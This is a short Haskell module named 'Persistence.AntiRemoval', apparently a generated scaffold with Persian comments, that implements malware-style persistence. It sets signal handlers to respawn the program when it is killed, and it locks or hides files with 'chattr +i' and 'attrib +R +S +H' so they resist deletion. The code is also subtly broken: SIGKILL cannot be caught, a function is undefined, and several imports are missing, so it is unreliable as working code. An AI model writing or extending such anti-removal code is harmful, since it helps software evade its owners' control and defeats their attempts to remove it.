-- AntiRemoval.hs
-- Auto-generated scaffold.

module Persistence.AntiRemoval where

import System.Directory
import System.FilePath
import System.Posix.Process
import System.Posix.Signals
import Control.Monad
import Control.Concurrent

installAntiRemoval :: IO ()
installAntiRemoval = do
    -- نظارت بر فرآیند خود
    forkIO $ monitorSelf
    
    -- حفاظت از فایل‌های سیستمی
    protectCriticalFiles

monitorSelf :: IO ()
monitorSelf = do
    pid <- getProcessID
    installHandler sigTERM (Catch $ respawn pid) Nothing
    installHandler sigKILL (Catch $ respawn pid) Nothing
    forever $ threadDelay 10000000

respawn :: ProcessID -> IO ()
respawn pid = do
    putStrLn "💥 Attempted kill detected! Respawning..."
    exePath <- getExecutablePath
    callProcess exePath []
    exitImmediately ExitSuccess

protectCriticalFiles :: IO ()
protectCriticalFiles = do
    files <- getCriticalFiles
    mapM_ setImmutableFlag files

setImmutableFlag :: FilePath -> IO ()
setImmutableFlag path = do
    setFileMode path (ownerReadMode `unionFileModes` ownerWriteMode)
    callCommand $ "chattr +i " ++ path
    callCommand $ "attrib +R +S +H " ++ path  -- برای ویندوز
    